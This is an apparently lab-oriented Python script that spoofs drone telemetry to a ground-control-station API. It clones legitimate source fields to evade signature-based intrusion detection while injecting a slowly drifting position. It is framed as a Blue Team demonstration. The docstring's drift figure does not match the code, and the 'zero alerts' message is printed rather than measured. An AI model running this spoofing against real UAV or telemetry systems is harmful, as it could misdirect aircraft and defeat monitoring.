"""
Mimicry Attack — 정상 동작 완전 모방 공격
독창 시나리오 #16 | arXiv:2301.14345 "Mimicry Attacks against ML-based Anomaly Detection in CPS"

이 공격은 가장 은밀한 시나리오:
  - IDS 시그니처 필드(source_authority, source_id, source prefix)를 일절 사용하지 않음
  - 대시보드의 실제 소스 ID("dashboard-edge-sim")를 그대로 사용
  - track_confidence=0.91, link_quality=0.97 (정상값과 동일)
  - 유일한 차이: 위치에 매 틱 0.05m 계통 편향(systematic bias) 누적

탐지 방법:
  - 규칙 기반 IDS: 탐지 불가 (모든 시그니처 정상)
  - 통계적 이상 탐지: 위치 편차의 장기 이동 평균으로만 식별 가능
  - 독립 센서 교차 검증(INS/광학): 미도입 시 탐지 불가

결과:
  - 30분 운용 후 누적 이탈: ~54m (실전에서 작전 실패 수준)
  - Blue Team 관점에서 ML 이상 탐지 도입의 필요성을 시연
"""
from __future__ import annotations

import argparse
import time
from .common import GcsClient, wait_for_gcs


BASE_POS = [200.0, -220.0, 95.0]   # small-dronebot-01 기본 위치
DRIFT_PER_TICK = 0.05               # 틱당 누적 편향 (m) — 탐지 임계값 이하


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="Mimicry 공격")
    parser.add_argument("--service-url",    default="http://dah-gcs:8080")
    parser.add_argument("--target-asset",   default="small-dronebot-01")
    parser.add_argument("--drift-per-tick", type=float, default=DRIFT_PER_TICK,
                        help="틱당 X축 누적 편향 (m, 기본 0.05)")
    parser.add_argument("--interval-s",     type=float, default=1.0)
    parser.add_argument("--duration-s",     type=float, default=120.0)
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    print(
        f"[mimicry] Mimicry Attack 시작\n"
        f"  대상: {args.target_asset}\n"
        f"  편향 속도: {args.drift_per_tick}m/틱\n"
        f"  탐지 가능성: IDS 규칙 기반 → 탐지 불가 (모든 필드가 정상값)\n"
        f"  source_id='dashboard-edge-sim' source_authority='ROKA UTM Cell' 사용\n"
        f"  track_confidence=0.91 link_quality=0.97 (정상과 동일)",
        flush=True,
    )

    start = time.time()
    tick = 0
    cumulative_drift = 0.0

    while (time.time() - start) < args.duration_s:
        cumulative_drift += args.drift_per_tick

        # 정상 대시보드 소스 필드를 완전히 복제 → IDS 우회
        pos = [
            BASE_POS[0] + cumulative_drift,   # X만 편향 누적 (가장 감지 어려운 패턴)
            BASE_POS[1],
            BASE_POS[2],
        ]

        try:
            client.post("/api/telemetry/ingest", {
                "asset_id":         args.target_asset,
                "time_s":           tick % 420,
                "position":         pos,
                "velocity_mps":     [14.0, 1.2, 0.0],
                "heading_deg":      90.0,
                "status":           "edge-live",

                # ↓ 정상 대시보드 소스와 완전히 동일 — IDS 시그니처 없음
                "source":           "dashboard-edge-sim",
                "source_id":        "dashboard-edge-sim",
                "source_type":      "uav_edge",
                "source_authority": "ROKA UTM Cell",
                "track_confidence": 0.91,
                "link_quality":     0.97,
                "link_profile":     "rf_normal",
                "battery_wh":       690.0,
            })
        except Exception as e:
            print(f"[mimicry] 주입 오류 tick={tick}: {e}", flush=True)

        if tick % 20 == 0:
            print(
                f"[mimicry] tick={tick:04d} | 누적 편향={cumulative_drift:.2f}m | "
                f"현재 위치={pos[0]:.2f},{pos[1]:.2f},{pos[2]:.2f}\n"
                f"  → IDS 경보 없음 (모든 필드 정상값)",
                flush=True,
            )

        tick += 1
        time.sleep(args.interval_s)

    final_drift = tick * args.drift_per_tick
    print(
        f"\n[mimicry] 종료\n"
        f"  총 틱: {tick} | 최종 누적 편향: {final_drift:.1f}m\n"
        f"  IDS 경보 발생: 0건 (완전 은닉 성공)\n"
        f"  30분 연장 시 예상 편향: {30*60*args.drift_per_tick:.0f}m",
        flush=True,
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
